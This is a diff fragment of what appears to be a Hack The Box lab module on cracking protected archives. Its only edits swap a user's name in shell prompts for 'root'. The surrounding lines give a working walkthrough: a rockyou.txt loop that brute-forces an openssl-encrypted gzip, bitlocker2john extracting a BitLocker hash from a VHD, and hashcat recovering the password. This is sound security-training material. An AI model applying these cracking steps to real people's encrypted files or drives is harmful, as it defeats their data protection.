+root@htb[/htb]$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
 
 gzip: stdin: not in gzip format
 tar: Child returned status 1
@@ -5162,7 +5162,7 @@ Once the for-loop has finished, we can look in the current folder again to check
 &#x20; Protected Archives
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls
+root@htb[/htb]$ ls
 
 customers.csv  GZIP.gzip  rockyou.txt
 ```
@@ -5180,9 +5180,9 @@ Virtual drives are often created in which personal information, notes, and docum
 &#x20; Protected Archives
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
-AbdulrahmanTamim@htb[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
-AbdulrahmanTamim@htb[/htb]$ cat backup.hash
+root@htb[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
+root@htb[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
+root@htb[/htb]$ cat backup.hash
 
 $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e...SNIP...70696f7eab6b
 ```
@@ -5194,7 +5194,7 @@ Both `John` and `Hashcat` can be used for this purpose. This example will look a
 &#x20; Protected Archives
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
+root@htb[/htb]$ hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
 
 hashcat (v6.1.1) starting...
 
@@ -5227,7 +5227,7 @@ Stopped: Wed Feb  9 11:48:23 2022
 &#x20; Protected Archives
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat backup.cracked 
+root@htb[/htb]$ cat backup.cracked 
 
 $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
 ```
